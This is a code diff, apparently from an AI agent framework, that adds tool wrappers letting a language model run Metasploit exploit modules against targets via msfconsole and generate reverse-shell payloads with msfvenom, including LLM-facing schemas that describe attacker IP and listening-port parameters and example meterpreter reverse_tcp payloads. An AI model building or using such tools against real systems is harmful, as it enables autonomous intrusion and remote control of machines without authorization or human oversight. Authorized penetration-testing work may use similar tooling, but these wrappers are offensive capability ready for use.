@@ -553,6 +553,45 @@ else:
 		}
 		return "[SLIVER]\n" + out
 	}
+
+	// ── 19. METASPLOIT FRAMEWORK ──────────────────────────────────────────────
+	r.builtins["run_metasploit"] = func(ctx context.Context, args map[string]any) string {
+		module, _ := args["module"].(string)
+		options, _ := args["options"].(string)
+		if module == "" {
+			return "[Error] module is required (e.g. 'exploit/multi/http/maradb_rce')"
+		}
+		cmd := fmt.Sprintf("msfconsole -q -x 'use %s; %s; run; exit'", module, options)
+		res, err := r.sandbox.Execute(ctx, cmd)
+		if err != nil {
+			return fmt.Sprintf("[Metasploit Error] %v\nOutput: %s", err, res)
+		}
+		return fmt.Sprintf("[MSFCONSOLE — %s]\n%s", module, res)
+	}
+
+	// ── 20. MSFVENOM PAYLOAD GENERATOR ───────────────────────────────────────
+	r.builtins["run_msfvenom"] = func(ctx context.Context, args map[string]any) string {
+		payload, _ := args["payload"].(string)
+		lhost, _ := args["lhost"].(string)
+		lport, _ := args["lport"].(string)
+		format, _ := args["format"].(string)
+		out, _ := args["output_file"].(string)
+		if payload == "" || lhost == "" || lport == "" {
+			return "[Error] payload, lhost, and lport are required"
+		}
+		if format == "" {
+			format = "elf"
+		}
+		if out == "" {
+			out = "/tmp/payload." + format
+		}
+		cmd := fmt.Sprintf("msfvenom -p %s LHOST=%s LPORT=%s -f %s -o %s", payload, lhost, lport, format, out)
+		res, err := r.sandbox.Execute(ctx, cmd)
+		if err != nil {
+			return fmt.Sprintf("[MSFVenom Error] %v\nOutput: %s", err, res)
+		}
+		return fmt.Sprintf("[MSFVENOM — %s] Payload generated at %s\n%s", payload, out, res)
+	}
 }
 
 // toolWrapperDefinitions returns LLM-facing tool schemas for all wrappers.
@@ -836,6 +875,39 @@ func toolWrapperDefinitions() []openai.ChatCompletionToolParam {
 						"args":       map[string]interface{}{"type": "string", "description": "Arguments for the subcommand (e.g. '--os windows --http 10.0.0.5 --save /tmp/implant')"},
 					},
 					"required": []string{"subcommand"},
+				},
+			},
+		},
+		{
+			Type: "function",
+			Function: openai.FunctionDefinitionParam{
+				Name:        "run_metasploit",
+				Description: openai.String("Execute a Metasploit Framework module (exploit, auxiliary, post) via msfconsole against a target."),
+				Parameters: openai.FunctionParameters{
+					"type": "object",
+					"properties": map[string]interface{}{
+						"module":  map[string]interface{}{"type": "string", "description": "Metasploit module path (e.g. 'exploit/multi/http/maradb_rce', 'auxiliary/scanner/http/http_version')"},
+						"options": map[string]interface{}{"type": "string", "description": "Semicolon-separated msfconsole option sets (e.g. 'set RHOSTS 192.168.1.10; set RPORT 80; set TARGETURI /')"},
+					},
+					"required": []string{"module"},
+				},
+			},
+		},
+		{
+			Type: "function",
+			Function: openai.FunctionDefinitionParam{
+				Name:        "run_msfvenom",
+				Description: openai.String("Generate a reverse shell or standalone payload using MSFVenom."),
+				Parameters: openai.FunctionParameters{
+					"type": "object",
+					"properties": map[string]interface{}{
+						"payload":     map[string]interface{}{"type": "string", "description": "Metasploit payload name (e.g. 'linux/x64/meterpreter/reverse_tcp', 'windows/x64/meterpreter/reverse_tcp')"},
+						"lhost":       map[string]interface{}{"type": "string", "description": "Attacker IP address for reverse connection"},
+						"lport":       map[string]interface{}{"type": "string", "description": "Attacker listening port"},
+						"format":      map[string]interface{}{"type": "string", "description": "Output format: elf, exe, raw, python, c (default: elf)"},
+						"output_file": map[string]interface{}{"type": "string", "description": "Destination file path in workspace (default: /tmp/payload.<format>)"},
+					},
+					"required": []string{"payload", "lhost", "lport"},
 				},
 			},
 		},
